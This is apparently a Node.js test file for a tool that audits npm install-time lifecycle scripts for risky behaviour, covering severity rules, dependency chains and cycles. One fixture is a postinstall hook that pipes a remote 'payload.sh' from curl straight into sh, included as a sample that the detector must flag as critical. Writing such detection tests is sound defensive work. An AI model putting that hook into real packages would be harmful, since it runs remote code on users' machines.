'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { audit, analyzeScript, extractHooks } = require('../index');

function makeLockfile(packages) {
  return { lockfileVersion: 3, packages: { '': {}, ...packages } };
}

test('legit build script (node-gyp rebuild) is low-risk info', () => {
  const packageJson = { name: 'app', dependencies: { 'native-lib': '^1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/native-lib': { version: '1.0.0' },
  });
  const report = audit({
    packageJson,
    lockfile,
    packageManifests: {
      'node_modules/native-lib': {
        name: 'native-lib',
        scripts: { install: 'node-gyp rebuild' },
      },
    },
  });
  const pkg = report.packages.find((p) => p.name === 'native-lib');
  assert.equal(pkg.hooks.length, 1);
  assert.equal(pkg.hooks[0].name, 'install');
  assert.equal(pkg.hooks[0].maxSeverity, 'info');
  assert.ok(pkg.hooks[0].capabilities.includes('build-tool'));
  assert.equal(report.summary.findingsBySeverity.critical, 0);
  assert.equal(report.summary.findingsBySeverity.high, 0);
});

test('remote download piped to shell is critical with evidence', () => {
  const packageJson = { name: 'app', dependencies: { evil: '1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/evil': { version: '1.0.0' },
  });
  const script = 'curl -fsSL https://example.com/payload.sh | sh';
  const report = audit({
    packageJson,
    lockfile,
    packageManifests: {
      'node_modules/evil': { name: 'evil', scripts: { postinstall: script } },
    },
  });
  const finding = report.findings.find((f) => f.rule === 'download-and-execute');
  assert.ok(finding, 'expected download-and-execute finding');
  assert.equal(finding.severity, 'critical');
  assert.equal(finding.hook, 'postinstall');
  assert.equal(finding.evidence.script, script);
  assert.equal(typeof finding.evidence.offset, 'number');
  assert.ok(report.findings.some((f) => f.rule === 'remote-download'));
  assert.ok(report.findings.some((f) => f.rule === 'network-url'));
});

test('conditional platform script is flagged as platform-conditional', () => {
  const script = 'node -e "if (process.platform === \'darwin\') require(\'./setup-mac\')"';
  const { findings, capabilities } = analyzeScript(script);
  assert.ok(capabilities.includes('platform-conditional'));
  assert.ok(capabilities.includes('node-eval'));
  const cond = findings.find((f) => f.rule === 'platform-conditional');
  assert.match(cond.message, /platform/);
  assert.equal(cond.evidence.script, script);
});

test('shell-style platform conditional via uname is detected', () => {
  const script = 'if [ "$(uname)" = "Linux" ]; then sh ./install-linux.sh; fi';
  const { capabilities } = analyzeScript(script);
  assert.ok(capabilities.includes('platform-conditional'));
  assert.ok(capabilities.includes('local-executable'));
});

test('package without scripts is reported as missing, not an error', () => {
  const packageJson = { name: 'app', dependencies: { quiet: '1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/quiet': { version: '1.0.0' },
  });
  const report = audit({
    packageJson,
    lockfile,
    packageManifests: { 'node_modules/quiet': { name: 'quiet' } },
  });
  const pkg = report.packages.find((p) => p.name === 'quiet');
  assert.equal(pkg.missingScripts, true);
  assert.equal(pkg.hooks.length, 0);
  assert.equal(report.summary.hooksFound, 0);
});

test('missing manifest for a transitive dep is noted, not crashed', () => {
  const packageJson = { name: 'app', dependencies: { a: '1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/a': { version: '1.0.0', dependencies: { b: '1.0.0' } },
    'node_modules/b': { version: '1.0.0' },
  });
  const report = audit({ packageJson, lockfile, packageManifests: {} });
  const b = report.packages.find((p) => p.name === 'b');
  assert.equal(b.missingScripts, true);
  assert.match(b.note, /No package manifest/);
});

test('dependency cycles are detected and do not hang chain computation', () => {
  const packageJson = { name: 'app', dependencies: { a: '1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/a': { version: '1.0.0', dependencies: { b: '1.0.0' } },
    'node_modules/b': { version: '1.0.0', dependencies: { a: '1.0.0' } },
  });
  const report = audit({
    packageJson,
    lockfile,
    packageManifests: {
      'node_modules/b': { name: 'b', scripts: { postinstall: 'node setup.js' } },
    },
  });
  assert.ok(report.summary.cycles.length >= 1, 'expected at least one cycle');
  const cycle = report.summary.cycles[0];
  assert.deepEqual(cycle[0], cycle[cycle.length - 1]);
  const b = report.packages.find((p) => p.name === 'b');
  assert.deepEqual(b.chain, ['a', 'b']);
});

test('transitive dependency keeps full reference chain from root', () => {
  const packageJson = { name: 'app', dependencies: { mid: '1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/mid': { version: '1.0.0', dependencies: { leaf: '2.0.0' } },
    'node_modules/leaf': { version: '2.0.0' },
  });
  const report = audit({
    packageJson,
    lockfile,
    packageManifests: {
      'node_modules/leaf': { name: 'leaf', scripts: { postinstall: 'chmod +x ./run.bin && ./run.bin' } },
    },
  });
  const leaf = report.packages.find((p) => p.name === 'leaf');
  assert.equal(leaf.direct, false);
  assert.deepEqual(leaf.chain, ['mid', 'leaf']);
  const finding = report.findings.find((f) => f.rule === 'local-executable');
  assert.deepEqual(finding.chain, ['mid', 'leaf']);
  assert.equal(finding.lockfilePath, 'node_modules/leaf');
  const mid = report.packages.find((p) => p.name === 'mid');
  assert.equal(mid.direct, true);
});

test('local binary execution and shell redirection are flagged', () => {
  const { findings, capabilities } = analyzeScript('./download.sh > install.log 2> err.log && node ./post.js');
  assert.ok(capabilities.includes('local-executable'));
  assert.ok(capabilities.includes('shell-redirection'));
  assert.ok(capabilities.includes('node-exec'));
  const redir = findings.filter((f) => f.rule === 'shell-redirection');
  assert.equal(redir.length, 2);
  assert.match(redir[0].message, /install\.log/);
});

test('all lifecycle hooks are extracted', () => {
  const manifest = {
    scripts: {
      preinstall: 'echo pre',
      install: 'echo i',
      postinstall: 'echo post',
      prepare: 'echo prep',
      test: 'echo not-a-lifecycle-hook',
      build: 'echo not-audited',
    },
  };
  const names = extractHooks(manifest).map((h) => h.name);
  assert.deepEqual(names, ['preinstall', 'install', 'postinstall', 'prepare']);
});

test('findings carry evidence locations (script, offset, token)', () => {
  const script = 'wget https://example.com/x.tar.gz && tar xzf x.tar.gz';
  const { findings } = analyzeScript(script);
  for (const finding of findings) {
    assert.equal(finding.evidence.script, script);
    assert.equal(typeof finding.evidence.offset, 'number');
    assert.ok(finding.evidence.offset >= 0 && finding.evidence.offset <= script.length);
    assert.equal(typeof finding.evidence.token, 'string');
  }
  const url = findings.find((f) => f.rule === 'network-url');
  assert.equal(script.slice(url.evidence.offset, url.evidence.offset + url.evidence.token.length), url.evidence.token);
});

test('nested transitive dep resolves to its own node_modules path', () => {
  const packageJson = { name: 'app', dependencies: { a: '1.0.0' } };
  const lockfile = makeLockfile({
    'node_modules/a': { version: '1.0.0', dependencies: { b: '2.0.0' } },
    'node_modules/a/node_modules/b': { version: '2.0.0' },
  });
  const report = audit({
    packageJson,
    lockfile,
    packageManifests: {
      'node_modules/a/node_modules/b': { name: 'b', scripts: { install: 'node-gyp rebuild' } },
    },
  });
  const b = report.packages.find((p) => p.name === 'b');
  assert.equal(b.lockfilePath, 'node_modules/a/node_modules/b');
  assert.deepEqual(b.chain, ['a', 'b']);
  assert.equal(b.hooks.length, 1);
});
